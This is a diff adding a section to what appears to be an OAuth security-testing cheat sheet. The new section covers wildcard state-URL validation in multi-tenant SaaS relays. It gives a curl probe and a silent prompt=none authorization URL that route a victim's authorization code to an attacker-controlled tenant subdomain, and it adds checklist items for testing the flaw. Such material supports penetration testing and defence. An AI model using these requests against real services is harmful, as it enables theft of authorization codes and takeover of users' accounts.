@@ -131,7 +131,44 @@ grant_type=authorization_code
 2. Victim signs up with OAuth using same email
 3. Insecure merge leaves attacker with access
 
-### 6. Cross-App Token Abuse
+### 6. Wildcard State URL Validation (SaaS Multi-Tenant)
+
+**Pattern:** Shared OAuth client where `state` contains a URL validated against `*.saas.com`.
+
+```
+Shared IdP → OAuth relay validates state URL → routes code to state URL
+If state = https://attacker-tenant.saas.com/steal → code routed to attacker
+```
+
+**Test the relay directly (no auth needed):**
+```bash
+curl -D - --max-redirs 0 \
+  "https://relay.target.com/callback?code=TEST123&state=https://your-tenant.target.com/steal%7Cctx"
+
+# Vulnerable: 302 to your-tenant.target.com
+# Patched: 400 invalid_state
+```
+
+**Silent exploitation (prompt=none):**
+```
+https://idp.target.com/authorize?
+  client_id=SHARED_ID&
+  redirect_uri=https://relay.target.com&
+  response_type=code&
+  scope=openid+email&
+  prompt=none&
+  state=https://attacker-tenant.target.com/steal|ctx
+
+# If victim has active session → code delivered silently, no interaction
+```
+
+**What to look for:**
+- All tenants share one `client_id` (check JS bundles, OAuth URLs)
+- State param contains a URL (not an opaque nonce)
+- You have (or can get) control of a `*.target.com` subdomain
+- `prompt=none` accepted by the IdP
+
+### 7. Cross-App Token Abuse
 
 ```http
 # Token from App A used against App B
@@ -187,6 +224,9 @@ redirect_uri=https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/[at
 - [ ] Test prompt parameter manipulation
 - [ ] Check response_mode variations
 - [ ] Test clickjacking on consent dialogs
+- [ ] Check if state contains a URL (wildcard validation → multi-tenant bypass)
+- [ ] Test prompt=none with wildcard state for silent exploitation
+- [ ] Look for shared client_id across multiple subdomains/tenants
 
 ---
 
